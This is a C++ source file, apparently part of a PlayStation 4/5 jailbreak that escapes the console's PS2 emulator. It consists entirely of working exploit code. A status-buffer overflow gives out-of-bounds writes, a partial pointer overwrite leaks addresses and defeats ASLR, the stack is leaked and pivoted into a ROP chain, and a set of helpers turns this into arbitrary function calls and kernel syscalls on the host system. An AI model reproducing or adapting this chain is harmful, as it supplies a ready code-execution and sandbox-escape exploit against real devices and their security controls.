#if (defined(PS4) && PS4) || (defined(PS5) && PS5)
#include <ps/breakout.hpp>
#include <ps2/ps2.hpp>
#include <ps2/okage.hpp>
#include <ps2/cdvd.hpp>
#include <offsets/ps/eboot/eboot.hpp>

namespace PS
{
    void SendTrophyPumpCommand(uint32_t command, uint64_t handle, uint64_t trophyId);
}

PS::Breakout::Shared* PS::Breakout::shared = (PS::Breakout::Shared*)BREAKOUT_SHARED;
uint32_t PS::Breakout::nStatusIndex = 0;

uint32_t PS::Breakout::chainIndex = 0;
uint64_t* PS::Breakout::chain = (uint64_t*)ROP_CHAIN;

char PS::Breakout::tempVar[256];

void PS::Breakout::init()
{
    Okage::clearScreenText();

    // Kill all other threads
    PS2::killThreads();

    // Leak EBOOT diff
    PS::Breakout::leakEboot();

    // Leak stack address
    PS::Breakout::leakStack();

    // Restore read handler
    PS::Breakout::restoreReadHandler();

    // Setup stage 1 ROP
    PS::Breakout::setupROP();

    // Leak LibKernel address
    #ifdef LIB_KERNEL_SCE_KERNEL_USLEEP
    PS::Breakout::shared->libKernelAddress = DEREF(EBOOT(EBOOT_SCE_KERNEL_USLEEP_STUB_PTR)) - LIB_KERNEL_SCE_KERNEL_USLEEP;
    #else
    PS::Breakout::shared->libKernelAddress = 0;
    #endif

    // Set global ROP gadgets
    PS::Breakout::shared->gadgetRet = GADGET(RET);
    PS::Breakout::shared->gadgetPopRaxRet = GADGET(POP_RAX_RET);
    PS::Breakout::shared->gadgetPopRbxRet = GADGET(POP_RBX_RET);

    // Exit trophy thread
    PS::SendTrophyPumpCommand(2002, 0, 0);
}

void PS::Breakout::restore()
{
    // Restore write handler
    PS::Breakout::restoreWriteHandler();

    // Reset statuses
    PS::Breakout::resetSStatusIndex();
    PS::Breakout::resetNStatusIndex();
}

void PS::Breakout::resetSStatusIndex()
{
    // Submit invalid command
    *(uint8_t*)SCMD_COMMAND = 0;

    // Wait for busy flag to be cleared
    int i = 0;
    while ((*(uint8_t*)SCMD_STATUS) & CMD_STATUS_BUSY)
    {
        i++;
        if (i > BREAKOUT_BUSY_TIMEOUT)
            break;
    }

    // Flush S command result
    uint8_t recv;
    i = 0;
    while (!((*(uint8_t*)SCMD_STATUS) & CMD_STATUS_EMPTY))
    {
        recv = *(uint8_t*)SCMD_RECV;
        i++;
        if (i > BREAKOUT_BUSY_TIMEOUT)
            break;
    }
}

void PS::Breakout::sStatusBufferOverflow(uint8_t* overflow, uint32_t size)
{
    PS::Breakout::resetSStatusIndex();

    // Fill the buffer
    for (int i = 0; i < 0x10; i++)
        *(uint8_t*)SCMD_SEND = 0;

    // Write out-of-bounds
    for (uint32_t i = 0; i < size; i++)
        *(uint8_t*)SCMD_SEND = overflow[i];
}

void PS::Breakout::resetNStatusIndex()
{
    // Submit invalid command
    *(uint8_t*)NCMD_COMMAND = 0;

    // Wait for busy flag to be cleared
    int i = 0;
    while ((*(uint8_t*)NCMD_STATUS) & CMD_STATUS_BUSY)
    {
        i++;
        if (i > BREAKOUT_BUSY_TIMEOUT)
            break;
    }

    PS::Breakout::nStatusIndex = 0;
}

void PS::Breakout::setOOBindex(uint32_t index)
{
    if (PS::Breakout::nStatusIndex == index)
        return;

    PS::Breakout::resetNStatusIndex();

    uint8_t overflow[0x60 + sizeof(index)] = {};

    // Overwrite N status index
    overflow[0x60 + 0] = index >> 0;
    overflow[0x60 + 1] = index >> 8;
    overflow[0x60 + 2] = index >> 16;
    overflow[0x60 + 3] = index >> 24;

    PS::Breakout::nStatusIndex = index;

    PS::Breakout::sStatusBufferOverflow(overflow, sizeof(overflow));
}

uint32_t PS::Breakout::writeOOB(uint32_t address, uint8_t value)
{
    PS::Breakout::setOOBindex(address - N_STATUS_BUFFER);
    *(uint8_t*)NCMD_SEND = value;
    PS::Breakout::nStatusIndex++;
    return 1;
}

uint32_t PS::Breakout::writeOOB(uint32_t address, uint16_t value)
{
    PS::Breakout::writeOOB(address + 0, (uint8_t)(value >> 0));
    PS::Breakout::writeOOB(address + 1, (uint8_t)(value >> 8));
    return 2;
}

uint32_t PS::Breakout::writeOOB(uint32_t address, uint32_t value)
{
    PS::Breakout::writeOOB(address + 0, (uint8_t)(value >> 0));
    PS::Breakout::writeOOB(address + 1, (uint8_t)(value >> 8));
    PS::Breakout::writeOOB(address + 2, (uint8_t)(value >> 16));
    PS::Breakout::writeOOB(address + 3, (uint8_t)(value >> 24));
    return 4;
}

uint32_t PS::Breakout::writeOOB(uint32_t address, uint64_t value)
{
    PS::Breakout::writeOOB(address + 0, (uint32_t)value);
    PS::Breakout::writeOOB(address + 4, (uint32_t)(value >> 32));
    return 8;
}

void PS::Breakout::restoreReadHandler()
{
    PS::Breakout::writeOOB(IO_REGISTER_READ_HANDLERS, EBOOT(IO_REGISTER_READ_HANDLER_ORIGINAL));
}

void PS::Breakout::restoreWriteHandler()
{
    PS::Breakout::writeOOB(INTERRUPT_WRITE_HANDLERS, EBOOT(INTERRUPT_WRITE_HANDLER_ORIGINAL));
}

uint32_t PS::Breakout::callGadgetAndGetResult(uint32_t gadget, uint32_t gadgetSize)
{
    // Addresses are different if ASLR is enabled, however the offset is static regardless
    volatile uint32_t* io = (volatile uint32_t*)(void*)0x10000000;

    // Corrupt the function pointer
    if (gadgetSize == 4)
        PS::Breakout::writeOOB(IO_REGISTER_READ_HANDLERS, gadget);

    // Overwrite just the least significant byte, for before we've defeated ASLR
    else if (gadgetSize == 1)
        PS::Breakout::writeOOB(IO_REGISTER_READ_HANDLERS, (uint8_t)gadget);

    // Call the corrupted function pointer
    return *io;
}

uint32_t PS::Breakout::leakEboot()
{
    // Corrupt the least significant byte of the first IO register read handler from 0x60 to 0x91 to point to `ret`
    // Originally points to XXXXXX60 (eg 0x005A9D60), overwrite points to XXXXXX91 (eg 0x005A9D91).
    // This will return the IO register read handler address as it was stored in EAX (eg: 0x060E7880)
    uint32_t ioFunctionPointerAddress = PS::Breakout::callGadgetAndGetResult(BREAKOUT_PARTIAL_POINTER_OVERWRITE_RET, 1);

    // ASLR EBOOT slide. If ASLR is disabled ebootDiff = 0
    PS::Breakout::shared->ebootDiff = ioFunctionPointerAddress - IO_REGISTER_READ_HANDLERS;
    return PS::Breakout::shared->ebootDiff;
}

uint64_t PS::Breakout::leakStack()
{
    uint32_t esp_add_eax = PS::Breakout::callGadgetAndGetResult(GADGET(ADD_EAX_ESP_RET), 4);
    uint32_t eax = EBOOT(IO_REGISTER_READ_HANDLERS);
    uint32_t esp = esp_add_eax - eax;
    uint32_t stackLeak = esp - BREAKOUT_STACK_DIFF;
    PS::Breakout::shared->stackAddress = (uint64_t)stackLeak | 0x700000000;
    return PS::Breakout::shared->stackAddress;
}

void PS::Breakout::setupGadgetWithArgument(uint32_t gadget)
{
    // Corrupt jump target
    PS::Breakout::writeOOB(INTERRUPT_WRITE_HANDLERS, gadget);
}

void PS::Breakout::setupROP()
{
    // Stage 1
    // [1]: Push RSI (stage1Address), Call stage1Address+0x3B ([2])
    // [2]: Pop RCX (rcx = ? from call), Pop RSP (rsp = stage1Address)
    // [3]: Pop RSP (rsp = rop_chain_native)
    PS::Breakout::writeOOB(STAGE_1 + 0x08, (uint32_t)PS::Breakout::chain);
    PS::Breakout::writeOOB(STAGE_1 + 0x08 + 0x04, (uint8_t)0x80); // 0x80XXXXXXXX (toNative)

    // [3] pop rsp ; ret
    PS::Breakout::writeOOB(STAGE_1 + 0x00, (uint32_t)GADGET(POP_RSP_RET));

    // [2] pop rcx ; fld st0, st5 ; clc ; pop rsp ; ret ;
    PS::Breakout::writeOOB(STAGE_1 + 0x3B, (uint32_t)GADGET(POP_RCX_FLD_ST0_ST5_CLC_POP_RSP_RET));

    // [1] push rsi ; add bh, cl ; call qword [rsi+0x3B] ;
    PS::Breakout::setupGadgetWithArgument(GADGET(PUSH_RSI_ADD_BH_CL_CALL_QWORD_OB_RSI_PLUS_0X3B_CB));
}

void PS::Breakout::resetChain()
{
    PS::Breakout::chainIndex = 0;
}

uint32_t PS::Breakout::pushChain(uint64_t value)
{
    PS::Breakout::chain[PS::Breakout::chainIndex++] = value;
    return PS::Breakout::chainIndex;
}

void PS::Breakout::executeChain()
{
    // Append ROP chain callee-saved register restore
    PS::Breakout::pushChain(GADGET(POP_RBX_RET));
    PS::Breakout::pushChain(BREAKOUT_RESTORE_RBX);
    // R12
    // R13
    PS::Breakout::pushChain(GADGET(POP_R14_RET));
    PS::Breakout::pushChain(BREAKOUT_RESTORE_R14);
    PS::Breakout::pushChain(GADGET(POP_R15_RET));
    PS::Breakout::pushChain(BREAKOUT_RESTORE_R15);
    PS::Breakout::pushChain(GADGET(POP_RBP_RET));
    PS::Breakout::pushChain(STACK(BREAKOUT_RESTORE_RBP_OFF));
    PS::Breakout::pushChain(GADGET(POP_RSP_RET));
    PS::Breakout::pushChain(STACK(BREAKOUT_RESTORE_RSP_OFF));

    // Execute ROP Chain
    volatile uint32_t *interruptRegisters = (volatile uint32_t*)(void*)0x1F801000;
    *interruptRegisters = EBOOT(STAGE_1);
}

uint64_t PS::Breakout::executeAndGetResult(uint64_t address)
{
    // Call gadget/function
    PS::Breakout::pushChain(address);

    // Get result
    uint64_t value = 0;
    PS::Breakout::getRAX(&value);

    // Trigger chain
    PS::Breakout::executeChain();
    return value;
}

void PS::Breakout::getRAX(uint64_t* value)
{
    PS::Breakout::setRSI(PVAR_TO_NATIVE(value)); // RSI = &value
    PS::Breakout::pushChain(GADGET(MOV_QWORD_OB_RSI_CB_RAX_RET)); // value = RAX
}

void PS::Breakout::setRAX(uint64_t rax)
{
    PS::Breakout::pushChain(GADGET(POP_RAX_RET));
    PS::Breakout::pushChain(rax);
}

void PS::Breakout::setRBX(uint64_t rbx)
{
    PS::Breakout::pushChain(GADGET(POP_RBX_RET));
    PS::Breakout::pushChain(rbx);
}

void PS::Breakout::setRCX(uint64_t rcx)
{
    PS::Breakout::pushChain(GADGET(POP_RCX_RET));
    PS::Breakout::pushChain(rcx);
}

// Changes RAX, RBX, RDX
void PS::Breakout::setRDX(uint64_t rdx)
{
    PS::Breakout::setRAX(rdx);
    PS::Breakout::setRBX(GADGET(POP_RBX_RET)); // Pop call return into RBX
    PS::Breakout::pushChain(GADGET(MOV_RDX_RAX_CALL_RBX));
}

void PS::Breakout::setRDI(uint64_t rdi)
{
    PS::Breakout::pushChain(GADGET(POP_RDI_RET));
    PS::Breakout::pushChain(rdi);
}

void PS::Breakout::setRSI(uint64_t rsi)
{
    PS::Breakout::pushChain(GADGET(POP_RSI_RET));
    PS::Breakout::pushChain(rsi);
}

// Changes RAX, RBX, R8
void PS::Breakout::setR8(uint64_t r8)
{
    PS::Breakout::setRBX(r8);
    uint64_t gadget = VAR_TO_NATIVE(PS::Breakout::shared->gadgetPopRaxRet);
    uint64_t gadget_off = gadget - (uint64_t)0x78;
    PS::Breakout::setRAX(gadget_off); // Pop call return into RAX
    PS::Breakout::pushChain(GADGET(MOV_R8_RBX_CALL_QWORD_OB_RAX_PLUS_0X78_CB));
}

// Changes RAX, RBX, R13
void PS::Breakout::setR13(uint64_t r13)
{
    PS::Breakout::setRAX(r13);
    uint64_t gadget = VAR_TO_NATIVE(PS::Breakout::shared->gadgetPopRbxRet);
    uint64_t gadget_off = gadget - (uint64_t)0x08;
    PS::Breakout::setRBX(gadget_off); // Pop call return into RBX
    PS::Breakout::pushChain(GADGET(MOV_R13_RAX_CALL_QWORD_OB_RBX_PLUS_0X08_CB));
}

// Changes RAX, RBX, RDI, R8, R9, R13
void PS::Breakout::setR9(uint64_t r9)
{
    // Set r9d to zero (r9d & 0)
    PS::Breakout::setR13(0);
    uint64_t gadget = VAR_TO_NATIVE(PS::Breakout::shared->gadgetRet);
    uint64_t gadget_off = gadget + (uint64_t)0x260032D7;
    PS::Breakout::setRBX(gadget_off);
    PS::Breakout::pushChain(GADGET(AND_R9D_R13D_JMP_QWORD_OB_RBX_0X260032D7_CB));

    // or r9, rax
    uint64_t r8 = VAR_TO_NATIVE(PS::Breakout::tempVar);
    PS::Breakout::setR8(r8);
    PS::Breakout::setRAX(r9);
    PS::Breakout::setRDI(0);
    PS::Breakout::pushChain(GADGET(OR_R9_RAX_MOVZX_EAX_DIL_SHL_RAX_0X04_MOV_QWORD_OB_R8_PLUS_RAX_CB_RCX_MOV_QWORD_OB_R8_PLUS_RAX_PLUS_0X08_CB_R9_RET));
}

uint64_t PS::Breakout::readMemoryU64(uint64_t address)
{
    uint64_t value = 0;
    PS::Breakout::resetChain();
    PS::Breakout::setRSI(address); // RSI = address
    PS::Breakout::pushChain(GADGET(MOV_RAX_QWORD_OB_RSI_CB_RET)); // RAX = *RSI = *address
    PS::Breakout::getRAX(&value);
    PS::Breakout::executeChain();
    return value;
}

uint64_t PS::Breakout::call(uint64_t address)
{
    PS::Breakout::resetChain();
    return PS::Breakout::executeAndGetResult(address);
}

uint64_t PS::Breakout::call(uint64_t address, uint64_t rdi)
{
    PS::Breakout::resetChain();
    PS::Breakout::setRDI(rdi);
    return PS::Breakout::executeAndGetResult(address);
}

uint64_t PS::Breakout::call(uint64_t address, uint64_t rdi, uint64_t rsi)
{
    PS::Breakout::resetChain();
    PS::Breakout::setRDI(rdi);
    PS::Breakout::setRSI(rsi);
    return PS::Breakout::executeAndGetResult(address);
}

uint64_t PS::Breakout::call(uint64_t address, uint64_t rdi, uint64_t rsi, uint64_t rdx)
{
    PS::Breakout::resetChain();
    PS::Breakout::setRDX(rdx);
    PS::Breakout::setRDI(rdi);
    PS::Breakout::setRSI(rsi);
    return PS::Breakout::executeAndGetResult(address);
}

uint64_t PS::Breakout::call(uint64_t address, uint64_t rdi, uint64_t rsi, uint64_t rdx, uint64_t rcx)
{
    PS::Breakout::resetChain();
    PS::Breakout::setRDX(rdx);
    PS::Breakout::setRDI(rdi);
    PS::Breakout::setRSI(rsi);
    PS::Breakout::setRCX(rcx);
    return PS::Breakout::executeAndGetResult(address);
}

uint64_t PS::Breakout::call(uint64_t address, uint64_t rdi, uint64_t rsi, uint64_t rdx, uint64_t rcx, uint64_t r8)
{
    PS::Breakout::resetChain();
    PS::Breakout::setR8(r8);
    PS::Breakout::setRDX(rdx);
    PS::Breakout::setRDI(rdi);
    PS::Breakout::setRSI(rsi);
    PS::Breakout::setRCX(rcx);
    return PS::Breakout::executeAndGetResult(address);
}

uint64_t PS::Breakout::call(uint64_t address, uint64_t rdi, uint64_t rsi, uint64_t rdx, uint64_t rcx, uint64_t r8, uint64_t r9)
{
    PS::Breakout::resetChain();
    PS::Breakout::setR9(r9);
    PS::Breakout::setR8(r8);
    PS::Breakout::setRDX(rdx);
    PS::Breakout::setRDI(rdi);
    PS::Breakout::setRSI(rsi);
    PS::Breakout::setRCX(rcx);
    return PS::Breakout::executeAndGetResult(address);
}

uint64_t PS::Breakout::call(uint64_t address, uint64_t rdi, uint64_t rsi, uint64_t rdx, uint64_t rcx, uint64_t r8, uint64_t r9, uint64_t stack1)
{
    PS::Breakout::resetChain();
    PS::Breakout::setR9(r9);
    PS::Breakout::setR8(r8);
    PS::Breakout::setRDX(rdx);
    PS::Breakout::setRDI(rdi);
    PS::Breakout::setRSI(rsi);
    PS::Breakout::setRCX(rcx);
    
    // Call gadget/function
    PS::Breakout::pushChain(address);

    // Pop the following argument off the stack
    PS::Breakout::pushChain(GADGET(POP_RCX_RET));
    PS::Breakout::pushChain(stack1);

    // Get result
    uint64_t value = 0;
    PS::Breakout::getRAX(&value);

    // Trigger chain
    PS::Breakout::executeChain();
    return value;
}

uint64_t PS::Breakout::call(uint64_t address, uint64_t rdi, uint64_t rsi, uint64_t rdx, uint64_t rcx, uint64_t r8, uint64_t r9, uint64_t stack1, uint64_t stack2)
{
    PS::Breakout::resetChain();
    PS::Breakout::setR9(r9);
    PS::Breakout::setR8(r8);
    PS::Breakout::setRDX(rdx);
    PS::Breakout::setRDI(rdi);
    PS::Breakout::setRSI(rsi);
    PS::Breakout::setRCX(rcx);

    // Call gadget/function
    PS::Breakout::pushChain(address);

    // Pop the following arguments off the stack
    PS::Breakout::pushChain(GADGET(POP_RCX_ROL_CH_0XF8_POP_RSI_RET));
    PS::Breakout::pushChain(stack1);
    PS::Breakout::pushChain(stack2);

    // Get result
    uint64_t value = 0;
    PS::Breakout::getRAX(&value);

    // Trigger chain
    PS::Breakout::executeChain();
    return value;
}

#ifdef LIB_KERNEL_SYS_RET
uint64_t PS::Breakout::syscall(int32_t index)
{
    PS::Breakout::resetChain();
    PS::Breakout::setRAX((uint64_t)index);
    return PS::Breakout::executeAndGetResult(LIBKERNEL(LIB_KERNEL_SYS_RET));
}

uint64_t PS::Breakout::syscall(int32_t index, uint64_t rdi)
{
    PS::Breakout::resetChain();
    PS::Breakout::setRAX((uint64_t)index);
    PS::Breakout::setRDI(rdi);
    return PS::Breakout::executeAndGetResult(LIBKERNEL(LIB_KERNEL_SYS_RET));
}

uint64_t PS::Breakout::syscall(int32_t index, uint64_t rdi, uint64_t rsi)
{
    PS::Breakout::resetChain();
    PS::Breakout::setRAX((uint64_t)index);
    PS::Breakout::setRDI(rdi);
    PS::Breakout::setRSI(rsi);
    return PS::Breakout::executeAndGetResult(LIBKERNEL(LIB_KERNEL_SYS_RET));
}

uint64_t PS::Breakout::syscall(int32_t index, uint64_t rdi, uint64_t rsi, uint64_t rdx)
{
    PS::Breakout::resetChain();
    PS::Breakout::setRDX(rdx);
    PS::Breakout::setRAX((uint64_t)index);
    PS::Breakout::setRDI(rdi);
    PS::Breakout::setRSI(rsi);
    return PS::Breakout::executeAndGetResult(LIBKERNEL(LIB_KERNEL_SYS_RET));
}

uint64_t PS::Breakout::syscall(int32_t index, uint64_t rdi, uint64_t rsi, uint64_t rdx, uint64_t rcx)
{
    PS::Breakout::resetChain();
    PS::Breakout::setRDX(rdx);
    PS::Breakout::setRAX((uint64_t)index);
    PS::Breakout::setRDI(rdi);
    PS::Breakout::setRSI(rsi);
    PS::Breakout::setRCX(rcx);
    return PS::Breakout::executeAndGetResult(LIBKERNEL(LIB_KERNEL_SYS_RET));
}

uint64_t PS::Breakout::syscall(int32_t index, uint64_t rdi, uint64_t rsi, uint64_t rdx, uint64_t rcx, uint64_t r8)
{
    PS::Breakout::resetChain();
    PS::Breakout::setR8(r8);
    PS::Breakout::setRDX(rdx);
    PS::Breakout::setRAX((uint64_t)index);
    PS::Breakout::setRDI(rdi);
    PS::Breakout::setRSI(rsi);
    PS::Breakout::setRCX(rcx);
    return PS::Breakout::executeAndGetResult(LIBKERNEL(LIB_KERNEL_SYS_RET));
}

uint64_t PS::Breakout::syscall(int32_t index, uint64_t rdi, uint64_t rsi, uint64_t rdx, uint64_t rcx, uint64_t r8, uint64_t r9)
{
    PS::Breakout::resetChain();
    PS::Breakout::setR9(r9);
    PS::Breakout::setR8(r8);
    PS::Breakout::setRDX(rdx);
    PS::Breakout::setRAX((uint64_t)index);
    PS::Breakout::setRDI(rdi);
    PS::Breakout::setRSI(rsi);
    PS::Breakout::setRCX(rcx);
    return PS::Breakout::executeAndGetResult(LIBKERNEL(LIB_KERNEL_SYS_RET));
}
#endif
#endif